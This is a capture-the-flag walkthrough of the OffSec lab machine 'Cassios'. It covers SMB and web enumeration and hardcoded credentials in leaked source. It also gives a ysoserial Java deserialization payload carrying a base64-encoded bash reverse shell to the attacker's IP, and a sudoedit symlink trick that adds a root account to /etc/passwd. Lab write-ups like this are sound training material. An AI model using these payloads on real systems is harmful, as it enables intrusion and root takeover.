# Cassios 

>OffSec Difficulty : Intermediate
>Community Difficulty : Very Hard

If you pay close attention to detail, you will be done before lunch. Otherwise, you will also be done before lunch... next week. 

## Recon
### Ports Scan
```
python3 autorecon.py 192.168.127.116
```

**Open Ports** 
```
22/tcp   open  ssh         syn-ack OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http        syn-ack Apache httpd 2.4.6 ((CentOS))
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn syn-ack Samba smbd 4.10.4 (workgroup: SAMBA)
8080/tcp open  http-proxy  syn-ack
```

### SSH Enumeration (22)
From the enumeration of SSH, we see that OpenSSH_7.4 is used, and various authentication methods are supported here. However, nothing significant to exploit apart from brute forcing which did not work.
```
22/tcp open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
|_banner: SSH-2.0-OpenSSH_7.4
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|     gssapi-keyex
|     gssapi-with-mic
|_    password
| ssh2-enum-algos: 
|   kex_algorithms: (12)
... 
...
```

### SMB Enumeration (139,445)
Below is an extracted version of the scan result, we can see that there is a share "Samantha Konstan" that we seem to have anonymous READ/WRITE permission for.
#### Nmap + Host Script
```
139/tcp open  netbios-ssn syn-ack Samba smbd 4.10.4 (workgroup: SAMBA)
Service Info: Host: CASSIOS

445/tcp open  netbios-ssn syn-ack Samba smbd 4.10.4 (workgroup: SAMBA)
Service Info: Host: CASSIOS

| smb-enum-shares: 
|   account_used: <blank>
|   \\192.168.127.116\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (Samba 4.10.4)
|     Users: 3
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|   \\192.168.127.116\Samantha Konstan: 
|     Type: STYPE_DISKTREE
|     Comment: Backups and Recycler files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\samantha\backups
|     Anonymous access: READ/WRITE
|   \\192.168.127.116\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\drivers
|_    Anonymous access: <none>
| smb-ls: Volume \\192.168.127.116\Samantha Konstan
|   maxfiles limit reached (10)
| SIZE   TIME                 FILENAME
| <DIR>  2023-02-05T06:33:43  .
| <DIR>  2020-09-24T17:38:10  ..
| 0      2020-09-24T01:35:15  recycler.ser
| 478    2020-09-24T17:32:50  readme.txt
| <DIR>  2020-09-24T17:36:11  spring-mvc-quickstart-archetype
| 4778   2020-09-24T17:35:01  spring-mvc-quickstart-archetype\README.md
| 774    2020-09-24T17:35:01  spring-mvc-quickstart-archetype\archetype-catalog.xml
| <DIR>  2020-09-24T17:35:01  spring-mvc-quickstart-archetype\src
| 1732   2020-09-24T17:36:11  spring-mvc-quickstart-archetype\pom.xml
| <DIR>  2020-09-24T17:36:54  thymeleafexamples-layouts
|_
```

Host script was also able to list the files and we see a `readme.txt` and a `recycler.ser` file which might be interesting.

#### SMBClient
From SMBClient, we found out that the "Samantha Konstan" drive is a back up share.
```
Anonymous login successful

Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
Samantha Konstan Disk      Backups and Recycler files
IPC$            IPC       IPC Service (Samba 4.10.4)
```

#### SMBMap/SMBClient
```
smbmap -H 192.168.127.116 -R --depth 2 --exclude ADMIN$ IPC$ C$ -A readme
```
Following this [guide](![[Pasted image 20230205154206.png]]) we downloaded the 2 interesting files using the command above and we read the readme file.

![[Pasted image 20230205154132.png]]

We cofirmed upload permission 
```shell
# connect to smb
smbclient //192.168.127.116/"Samantha Konstan"
#inside smb shell
smb: > put <local file> <remote file name>
```

![[Pasted image 20230205155957.png]]

### Web Enumeration (80, 8080)
#### Browser Enumeration Port 80
"Sign Up" function does not seem to be working.
![[Pasted image 20230205160806.png]]

#### Browser Enumeration Port 8080
This seems to be the app that the `readme.txt` is for.
![[Pasted image 20230205160637.png]]
And we will need to use a username and password to access the dashboard.
![[Pasted image 20230205160955.png]]

#### Directory Busting Port 80
From the results below we see some intersting output `/backup_migrate`
![[Pasted image 20230205161327.png]]
![[Pasted image 20230205161339.png]]

When we visited we are given a directory listing seen below:
![[Pasted image 20230205161512.png]]
Decompressing the recyler.tar is the source code and in this path `src/main/java/com/industrial/recycler/`, we find `WebSecurityConfig.java` file which contains username and password possibly for the webapp at port 8080.
`recycler:DoNotMessWithTheRecycler123`.

![[Pasted image 20230205162836.png]]

#### Directory Busting Port 8080
Nothing interesting here other than the login page.
![[Pasted image 20230205161403.png]]

We login with the credentials given above and we get these 3 buttons which we do not know what it does.

![[Pasted image 20230205163022.png]]

## Intial Foot Hold
We look to the source code `src/main/java/com/industrial/recycler/DashboardController.java`  

**Check function**

![[Pasted image 20230205163232.png]]

**Save function**

![[Pasted image 20230205163247.png]]

We realised that this app is reading input from `/home/samantha/backups/recycler.ser` with the "check" button and writing output to `recycler.ser` with the "save" button.

To confirm that the file that we have SMB access to is written when we click on the "save" button we login with SMBClient to view the file. `recycler.ser` has been altered.

![[Pasted image 20230205163447.png]]

We check what `.ser` file is and as can be seen below, .SER files are used to store serialized objects. 

![[Pasted image 20230205163728.png]]

```java
try {
     fis = new FileInputStream(filename);
     in  = new ObjectInputStream(fis);
     r   = (Recycler) in.readObject();
     in.close();
     } 
catch (Exception ex) {
     ex.printStackTrace();
}
```

From the code above, we see that there is no sanitization of serialized object. `recycler.ser` file is passed as a file name into `fis` File object which is then passed as an input object `in` which is then passed as a serialised object `r` by the [`readObject()` function](https://portswigger.net/web-security/deserialization/exploiting) which is vulnerable.

We use [ysoserial](https://github.com/frohoff/ysoserial) together with a [hacktricks cheatsheet](https://book.hacktricks.xyz/pentesting-web/deserialization#ysoserial) to generate the payload. (Java 16 and 17 will have issues running ysoserial) 

Base64 encoded bash reverse shell payload.

![[Pasted image 20230205172338.png]]

```bash
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ5LjEyNy80NDMgMD4mMQ==}|{base64,-d}|{bash,-i}" > recycler.ser
```

With smbclient we modified the original `recycler.ser` using the `PUT` command.

![[Pasted image 20230205172654.png]]

We click on check status and we get the reverse shell with user privilege .

![[Pasted image 20230205172814.png]]

## Privilege Escalation
We uploaded and executed linpeas and we are given a few results that could lead to privilege escalation.

![[Pasted image 20230205220438.png]]

The most probable result would be the one below as running a local exploit for privilege escalation is not offsec...

![[Pasted image 20230205220406.png]]

The pattern for the above [sudoedit](https://linux.die.net/man/8/sudoedit) permissions looks similar to the one found [here](https://www.exploit-db.com/exploits/37710). In our version to exploit, we will need to :
1. create a subdirectory within the home folder and the file has to be named `recycler.ser`
2. create a symbolic link to the a new file named `recycler.ser` in the new folder pointing to the file that requires privileged access.
3. run `sudoedit /home/directory/recycler.ser` with super user privilege.

```bash
#generate /etc/passwd username and password hash.
openssl passwd -1 -salt cyberches pwnpwn

#carry out sudoedit exploit to edit /etc/passwd file
mkdir /home/samantha/privesc
ln -s /etc/passwd /home/samantha/privesc/recycler.ser
sudoedit /home/samantha/privesc/recycler.ser
# in VIM G+A then add the below
# cyberches:$1$cyberche$8SlOq4I5fdCWAmXseBSIU0:0:0:/root:/bin/bash
# afterwards esc + enter then ":wq" enter
```

After adding the credentials to the last line of `/etc/passwd`, we will do a `su cyberches`, enter the credentials and we got root!

![[Pasted image 20230205230316.png]]

